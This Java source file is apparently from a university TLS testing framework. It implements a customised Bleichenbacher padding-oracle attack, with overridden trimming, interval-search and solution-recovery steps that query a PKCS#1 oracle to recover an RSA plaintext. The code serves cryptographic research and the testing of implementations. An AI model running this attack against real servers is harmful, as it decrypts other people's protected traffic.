/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package de.rub.nds.ssl.stack.tests.attacks.bleichenbacher;

import de.rub.nds.ssl.stack.Utility;
import de.rub.nds.ssl.stack.tests.attacks.bleichenbacher.oracles.StandardOracle;
import de.rub.nds.ssl.stack.tests.attacks.bleichenbacher.BleichenbacherAttackCrypto;
import de.rub.nds.ssl.stack.tests.attacks.bleichenbacher.oracles.AOracle;
import java.math.BigInteger;
import java.security.interfaces.RSAPublicKey;
import org.testng.internal.Utils;

/**
 *
 * @author juraj
 *
 * For experimentation purposes :)
 */
public class BleichenbacherAttackCustom extends BleichenbacherAttackCrypto {

    private BigInteger multiplier = BigInteger.ONE;
    private boolean divisionApplied = false;

    public BleichenbacherAttackCustom(final byte[] msg, AOracle pkcsOracle,
            int maxtUsed, final boolean msgPKCSconform) {
        super(msg, pkcsOracle, maxtUsed, msgPKCSconform);
    }

    @Override
    protected void stepOneC() {
        System.out.println("Step 1c: Trimming");

        if (oracle.getOracleType() != AOracle.OracleType.TTT) {
            throw new RuntimeException("not yet supported");
        }

        if (maxT.compareTo(BigInteger.ONE) != 0) {
            divisionApplied = true;
            multiplier = maxT.divide(BigInteger.valueOf(3));

            BigInteger intervalMin = m[0].lower.multiply(multiplier).divide(maxT);
            BigInteger intervalMax = m[0].upper.multiply(multiplier).divide(maxT);

            m = new Interval[]{new Interval(intervalMin, intervalMax)};
            System.out.println("IntervalMin: \n" + Utility.bytesToHex(intervalMin.toByteArray()));
            System.out.println("IntervalMax: \n" + Utility.bytesToHex(intervalMax.toByteArray()));

            BigInteger c = divideAndMultiply(maxT, multiplier, c0);
            c0 = c;
        }
    }

    @Override
    protected void stepTwoC() {
        byte[] send;
        boolean pkcsConform = false;
        BigInteger n = publicKey.getModulus();

        logger.debug("Step 2c: Searching with one interval left");

        // initial ri computation - ri = 2(b*(si-1)-2*B)/n
        BigInteger ri = si.multiply(m[0].upper);
        ri = ri.subtract(BigInteger.valueOf(2).multiply(bigB));
        ri = ri.multiply(BigInteger.valueOf(2));
        ri = ri.divide(n);

        // initial si computation
        BigInteger upperBound = step2cComputeUpperBound(ri, n,
                m[0].lower);
        BigInteger lowerBound = step2cComputeLowerBound(ri, n,
                m[0].upper);

        if (divisionApplied
                && (lowerBound.add(BigInteger.ONE).compareTo(upperBound) == 0)) {
            si = lowerBound;
            send = prepareMsg(c0, si);

            // check PKCS#1 conformity
            pkcsConform = oracle.checkPKCSConformity(send);
            if (!pkcsConform) {
                si = si.add(BigInteger.ONE);
            }
        } else {
            // to counter .add operation in do while
            si = lowerBound.subtract(BigInteger.ONE);

            do {
                si = si.add(BigInteger.ONE);
                // lowerBound <= si < upperBound
                if (si.compareTo(upperBound) > 0) {
                    ri = ri.add(BigInteger.ONE);
                    upperBound = step2cComputeUpperBound(ri, n,
                            m[0].lower);
                    lowerBound = step2cComputeLowerBound(ri, n,
                            m[0].upper);
                    si = lowerBound;
                }
                send = prepareMsg(c0, si);

                // check PKCS#1 conformity
                pkcsConform = oracle.checkPKCSConformity(send);
            } while (!pkcsConform);
        }
    }

    protected boolean stepFour(final int i) {
        boolean result = false;

        if (m.length == 1 && m[0].lower.compareTo(m[0].upper) == 0) {
            BigInteger solution = s0.modInverse(publicKey.getModulus());
            solution = solution.multiply(m[0].upper).mod(publicKey.getModulus());
            solution = solution.multiply(maxT);
            solution = solution.divide(multiplier);

            //if(solution.compareTo(new BigInteger(1, decryptedMsg)) == 0) {
            logger.info("====> Solution found!\n" + Utility.bytesToHex(solution.toByteArray()));
            //    System.out.println("original decrypted message: \n" + Utility.bytesToHex(decryptedMsg));
            //}
            logger.info("// Total # of queries: "
                    + oracle.getNumberOfQueries());

            result = true;
        }

        return result;
    }
//    @Override
//    protected void stepTwoC() {
//        byte[] send;
//        boolean pkcsConform = false;
//        BigInteger n = publicKey.getModulus();
//        boolean isLowerUpperBoundDifferenceOne = false;
//
//        logger.debug("Step 2c: Searching with one interval left");
//
//        // initial ri computation - ri = 2(b*(si-1)-2*B)/n
//        BigInteger ri = si.multiply(m[0].upper);
//        ri = ri.subtract(BigInteger.valueOf(2).multiply(bigB));
//        ri = ri.multiply(BigInteger.valueOf(2));
//        ri = ri.divide(n);
//
//        // initial si computation
//        BigInteger upperBound = step2cComputeUpperBound(ri, n,
//                m[0].lower);
//        BigInteger lowerBound = step2cComputeLowerBound(ri, n,
//                m[0].upper);
//
//        if (lowerBound.add(BigInteger.ONE).compareTo(upperBound) == 0) {
//            isLowerUpperBoundDifferenceOne = true;
//        }
//
//        // to counter .add operation in do while
//        si = lowerBound.subtract(BigInteger.ONE);
//
//        do {
//            si = si.add(BigInteger.ONE);
//            // lowerBound <= si < upperBound
//            if (si.compareTo(upperBound) > 0) {
//                if (isLowerUpperBoundDifferenceOne) {
//                    System.out.println("next found: ");
//                    System.out.println(Utility.bytesToHex(prepareMsg(c0, si.subtract(BigInteger.valueOf(1)))));
//                    System.out.println(Utility.bytesToHex(prepareMsg(c0, si.subtract(BigInteger.valueOf(0)))));
//                    BigInteger a = m[0].lower;
//                    BigInteger b = m[0].upper;
//                    Interval i1 = new Interval(a, 
//                            step2cComputeNewUpperBoundInterval1(ri, 
//                            si.subtract(BigInteger.valueOf(2)), n));
//                    Interval i2 = new Interval(
//                            step2cComputeNewLowerBoundInterval2(ri, 
//                            si.subtract(BigInteger.ONE), n), b);
//                    m = new Interval[] {i1, i2};
//                    System.out.println("next found: ");
//                    System.out.println(Utility.bytesToHex(i1.lower.toByteArray()));
//                    System.out.println(Utility.bytesToHex(i1.upper.toByteArray()));
//                    System.out.println(Utility.bytesToHex(i2.lower.toByteArray()));
//                    System.out.println(Utility.bytesToHex(i2.upper.toByteArray()));
//                    System.out.println("----");
//                    System.out.println("");
//                    return;
//                }
//
//                // new values
//                ri = ri.add(BigInteger.ONE);
//                upperBound = step2cComputeUpperBound(ri, n,
//                        m[0].lower);
//                lowerBound = step2cComputeLowerBound(ri, n,
//                        m[0].upper);
//                si = lowerBound;
//
//            }
//            send = prepareMsg(c0, si);
//
//            // check PKCS#1 conformity
//            pkcsConform = oracle.checkPKCSConformity(send);
//            
//        } while (!pkcsConform);
//    }
//
//    protected BigInteger step2cComputeNewUpperBoundInterval1(final BigInteger r,
//            final BigInteger si, final BigInteger modulus) {
//        BigInteger upperBound = BigInteger.valueOf(2).multiply(bigB);
//        upperBound = upperBound.add(r.multiply(modulus));
//        upperBound = upperBound.divide(si);
//
//        return upperBound;
//    }
//
//    protected BigInteger step2cComputeNewLowerBoundInterval2(final BigInteger r,
//            final BigInteger si, final BigInteger modulus) {
//        BigInteger lowerBound = BigInteger.valueOf(3).multiply(bigB);
//        lowerBound = lowerBound.add(r.multiply(modulus));
//        lowerBound = lowerBound.divide(si);
//
//        return lowerBound;
//    }
}
